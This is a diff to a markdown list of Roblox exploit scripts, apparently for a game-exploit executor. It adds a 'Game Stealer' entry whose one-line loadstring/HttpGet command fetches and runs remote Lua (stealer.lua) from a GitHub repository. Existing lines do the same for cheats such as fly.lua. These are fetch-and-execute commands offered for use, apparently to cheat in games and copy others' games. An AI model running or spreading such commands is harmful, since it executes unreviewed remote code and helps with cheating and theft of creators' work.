@@ -19,6 +19,11 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/iamtryingtofindname/K
 loadstring(game:HttpGet("https://raw.githubusercontent.com/iamtryingtofindname/Krampus/main/dump/fly.lua"))()
 ```
 
+**Game Stealer**
+```
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iamtryingtofindname/Krampus/main/dump/stealer.lua"))()
+```
+
 ## Da Hood
 
 ### Packages
